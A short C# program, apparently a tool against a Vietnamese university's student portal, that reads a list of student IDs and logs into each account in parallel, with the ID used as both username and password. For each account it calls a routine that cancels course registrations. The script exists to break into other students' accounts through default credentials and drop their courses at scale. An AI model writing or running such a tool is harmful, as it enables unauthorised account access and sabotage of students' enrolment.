using Request;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace ToolXoaMonHangLoat
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> listAcc = File.ReadAllLines("00.txt").ToList();
            Parallel.ForEach(listAcc, new ParallelOptions()
            {
                MaxDegreeOfParallelism = 100
            }, (Mssv) =>
            {
                using (HuyMonHoc vnu = new HuyMonHoc())
                {
                    vnu.User = Mssv;
                    vnu.Pass = Mssv;
                    vnu.Begin();
                }

            });
            Console.WriteLine($"{DateTime.Now} Done");
        }
    }
}
